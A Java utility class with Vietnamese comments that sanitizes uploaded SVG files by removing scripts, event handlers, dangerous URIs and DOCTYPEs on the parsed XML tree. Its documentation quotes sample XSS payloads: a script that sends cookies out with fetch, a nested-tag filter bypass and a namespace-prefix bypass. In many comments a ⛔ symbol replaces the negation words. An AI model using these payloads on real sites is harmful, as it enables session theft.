package com.songnhue.core.common.util;

import java.io.ByteArrayInputStream;
import java.io.StringWriter;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Pattern;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;

import org.w3c.dom.Attr;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;

import com.songnhue.core.common.error.ErrorCode;
import com.songnhue.core.common.exception.ValidationException;

/**
 * Khử trùng tệp SVG trước khi lưu — điểm nghiệp vụ 7 (WS-14/T14.6).
 *
 * <h2>Vì sao SVG cần một lớp riêng, trong khi JPG/PNG thì không</h2>
 *
 * SVG <b>không phải ảnh</b> theo nghĩa của các định dạng còn lại — nó là XML, và đặc tả của nó cho
 * phép nhúng JavaScript. Một tệp {@code logo.svg} hợp lệ hoàn toàn có thể chứa
 * {@code <script>fetch('https://…?c='+document.cookie)</script>}, và trình duyệt sẽ chạy đoạn đó khi
 * ai đó mở thẳng tệp hoặc khi trang nhúng nó bằng {@code <object>}/{@code <embed>}.
 *
 * <p>{@link FileValidator} không giúp được ở đây: SVG là văn bản thuần, <b>không có magic bytes</b>.
 * {@link ImageSanitizer} cũng không — {@code javax.imageio} không đọc được SVG nên nó trả nguyên bản
 * về. Nghĩa là nếu không có lớp này, SVG đi thẳng từ biểu mẫu vào kho lưu trữ, <i>không qua một lớp
 * kiểm nào</i>.
 *
 * <h2>Phạm vi cho phép</h2>
 *
 * Chốt của dự án: SVG <b>chỉ nhận ở màn hình cấu hình giao diện</b> (logo, favicon — người tải là
 * Quản trị viên), và <b>không nhận trong thư viện media hay nội dung bài viết</b>. Lớp này là lớp
 * thứ hai, không phải lớp duy nhất: đường vào đã hẹp rồi mới tới khử trùng.
 *
 * <h2>⛔⛔ Cách làm: lọc trên CÂY XML — T61.32 thay bản regex</h2>
 *
 * Bản WS-14 là 8 regex chạy <b>một lượt</b>. Lượt tự đánh giá ASVS (T61.28, mục 5.2.7) đo được hai đường
 * vượt, cả hai cho ra thẻ script CHẠY ĐƯỢC trong tệp đã "khử trùng":
 *
 * <ul>
 *   <li><b>Lồng</b>: {@code <scr<script></script>ipt>alert(1)</script>} — regex xoá cặp ở giữa, hai nửa
 *       ghép lại thành {@code <script>}.
 *   <li><b>Tiền tố namespace</b>: {@code <s:script xmlns:s="http://www.w3.org/2000/svg">} — trình duyệt
 *       phân tích SVG bằng bộ đọc XML nên đó VẪN là thẻ script; regex {@code <\s*script} ⛔ thấy.
 * </ul>
 *
 * Tệp được phát {@code inline} trên tên miền cổng. Nên nay: đọc bằng bộ phân tích XML <b>có namespace</b>
 * (so {@code localName}, ⛔ so chuỗi), gỡ phần tử/thuộc tính nguy hiểm trên cây, rồi ghi lại. Tệp ⛔ có gì
 * nguy hiểm trả <b>nguyên byte</b> — logo đẹp của người thiết kế ⛔ bị định dạng lại vô cớ.
 *
 * <p>Vẫn là danh sách CHẶN (người tải là Quản trị viên, số tệp đếm được, còn CSP phía sau) nhưng chặn trên
 * <b>cấu trúc</b>: ⛔ còn đường "viết khác đi một chút" nào mà bộ đọc XML của trình duyệt hiểu còn bộ lọc thì ⛔.
 * DOCTYPE ngoài (Illustrator hay sinh) được gỡ; DOCTYPE có tập con nội ({@code [<!ENTITY …>]}) bị TỪ CHỐI.
 */
public final class SvgSanitizer {

    private SvgSanitizer() {}

    public static final String MIME = "image/svg+xml";

    /** Phần tử chạy mã hoặc nhúng nội dung ngoài — so {@code localName} viết thường, mọi namespace. */
    private static final Set<String> PHAN_TU_CAM = Set.of(
            "script",
            "foreignobject",
            "iframe",
            "embed",
            "object",
            "handler",
            "set",
            "animate",
            "animatemotion",
            "animatetransform",
            "discard");

    /** {@code <a>}: gỡ THẺ, giữ chữ bên trong — đích bấm của nó ⛔ kiểm soát được. */
    private static final String THE_A = "a";

    /** DOCTYPE ngoài ⛔ tập con nội — dạng các phần mềm thiết kế sinh ra. */
    private static final Pattern DOCTYPE_NGOAI = Pattern.compile("(?is)<!DOCTYPE[^\\[>]*>");

    private static final Pattern TAP_CON_NOI = Pattern.compile("(?is)<!DOCTYPE[^>]*\\[");

    /**
     * Loại bỏ mọi phần có thể chạy mã.
     *
     * <p>Cắt bỏ chứ không từ chối cả tệp: một logo có thuộc tính {@code onload} thừa do phần mềm
     * thiết kế sinh ra vẫn là một logo dùng được.
     *
     * @throws ValidationException {@code SYS-0003} khi nội dung không phải SVG đọc được, hoặc mang DOCTYPE có
     *     tập con nội (đường tấn công thực thể XML)
     */
    public static byte[] sanitize(byte[] content, String originalName) {
        if (content == null || content.length == 0) {
            throw (ValidationException)
                    new ValidationException(ErrorCode.SYS_0003).withDetail("file", "FILE_EMPTY", originalName);
        }
        String xml = new String(content, StandardCharsets.UTF_8);
        if (TAP_CON_NOI.matcher(xml).find()) {
            throw tuChoi("svg-doctype-internal-subset");
        }
        String boDoctype = DOCTYPE_NGOAI.matcher(xml).replaceAll("");

        Document doc = docCay(boDoctype).orElseThrow(() -> tuChoi("not-svg"));
        Element goc = doc.getDocumentElement();
        if (!"svg".equalsIgnoreCase(tenCuc(goc))) {
            throw tuChoi("not-svg");
        }
        if (!lamSach(doc) && boDoctype.equals(xml)) {
            return content; // ⛔ có gì để gỡ — trả nguyên byte
        }
        return ghi(doc);
    }

    /** Nội dung này có còn phần chạy được không — dùng cho bài kiểm và cho log cảnh báo. */
    public static boolean coMaChayDuoc(byte[] content) {
        String xml = new String(content, StandardCharsets.UTF_8);
        if (TAP_CON_NOI.matcher(xml).find()) {
            return true;
        }
        return docCay(DOCTYPE_NGOAI.matcher(xml).replaceAll(""))
                .map(SvgSanitizer::lamSach)
                .orElse(true);
    }

    // -------------------------------------------------------------------------

    /** Gỡ phần nguy hiểm trên cây. @return có gỡ gì không */
    private static boolean lamSach(Document doc) {
        boolean daGo = false;
        List<Node> hangDoi = new ArrayList<>();
        hangDoi.add(doc);
        while (!hangDoi.isEmpty()) {
            Node n = hangDoi.remove(hangDoi.size() - 1);
            List<Node> con = new ArrayList<>();
            for (Node c = n.getFirstChild(); c != null; c = c.getNextSibling()) {
                con.add(c);
            }
            for (Node c : con) {
                if (c.getNodeType() == Node.PROCESSING_INSTRUCTION_NODE || c.getNodeType() == Node.DOCUMENT_TYPE_NODE) {
                    n.removeChild(c);
                    daGo = true;
                } else if (c.getNodeType() == Node.ELEMENT_NODE) {
                    Element e = (Element) c;
                    String ten = tenCuc(e).toLowerCase(Locale.ROOT);
                    if (PHAN_TU_CAM.contains(ten) || ("use".equals(ten) && useTroRaNgoai(e))) {
                        n.removeChild(e);
                        daGo = true;
                        continue;
                    }
                    daGo |= goThuocTinh(e);
                    if (THE_A.equals(ten)) {
                        while (e.getFirstChild() != null) {
                            n.insertBefore(e.getFirstChild(), e);
                        }
                        n.removeChild(e);
                        daGo = true;
                        hangDoi.add(n); // con vừa dời lên phải được xét
                        continue;
                    }
                    hangDoi.add(e);
                }
            }
        }
        return daGo;
    }

    private static boolean goThuocTinh(Element e) {
        boolean daGo = false;
        NamedNodeMap attrs = e.getAttributes();
        List<Attr> go = new ArrayList<>();
        for (int i = 0; i < attrs.getLength(); i++) {
            Attr a = (Attr) attrs.item(i);
            String ten = tenCuc(a).toLowerCase(Locale.ROOT);
            if (ten.startsWith("xmlns")) {
                continue;
            }
            if (ten.startsWith("on") || giaTriNguyHiem(a.getValue())) {
                go.add(a);
            }
        }
        for (Attr a : go) {
            e.removeAttributeNode(a);
            daGo = true;
        }
        return daGo;
    }

    /** {@code javascript:} / {@code data:text/html} kể cả khi chen khoảng trắng, ký tự điều khiển, hoa thường. */
    private static boolean giaTriNguyHiem(String v) {
        String gon = v.replaceAll("[\\s\\p{Cntrl}]", "").toLowerCase(Locale.ROOT);
        return gon.contains("javascript:") || gon.contains("vbscript:") || gon.contains("data:text/html");
    }

    private static boolean useTroRaNgoai(Element e) {
        for (String ten : List.of("href", "xlink:href")) {
            String v = e.getAttribute(ten).trim();
            if (!v.isEmpty() && !v.startsWith("#")) {
                return true;
            }
        }
        String v = e.getAttributeNS("http://www.w3.org/1999/xlink", "href").trim();
        return !v.isEmpty() && !v.startsWith("#");
    }

    private static String tenCuc(Node n) {
        String cuc = n.getLocalName();
        if (cuc != null) {
            return cuc;
        }
        String ten = n.getNodeName();
        return ten.substring(ten.indexOf(':') + 1);
    }

    private static java.util.Optional<Document> docCay(String xml) {
        try {
            DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
            f.setNamespaceAware(true);
            f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            f.setFeature("http://xml.org/sax/features/external-general-entities", false);
            f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            f.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
            f.setXIncludeAware(false);
            f.setExpandEntityReferences(false);
            DocumentBuilder b = f.newDocumentBuilder();
            b.setErrorHandler(new org.xml.sax.helpers.DefaultHandler()); // ném, ⛔ in "[Fatal Error]" ra stderr
            return java.util.Optional.of(b.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8))));
        } catch (Exception e) {
            return java.util.Optional.empty();
        }
    }

    private static byte[] ghi(Document doc) {
        try {
            TransformerFactory tf = TransformerFactory.newInstance();
            tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
            Transformer t = tf.newTransformer();
            t.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");
            t.setOutputProperty(OutputKeys.ENCODING, "UTF-8");
            StringWriter w = new StringWriter();
            t.transform(new DOMSource(doc), new StreamResult(w));
            return w.toString().getBytes(StandardCharsets.UTF_8);
        } catch (Exception e) {
            throw new IllegalStateException("Không ghi lại được SVG đã khử trùng", e);
        }
    }

    private static ValidationException tuChoi(String lyDo) {
        return (ValidationException)
                new ValidationException(ErrorCode.SYS_0003).withDetail("file", "FILE_TYPE_NOT_ALLOWED", lyDo);
    }
}
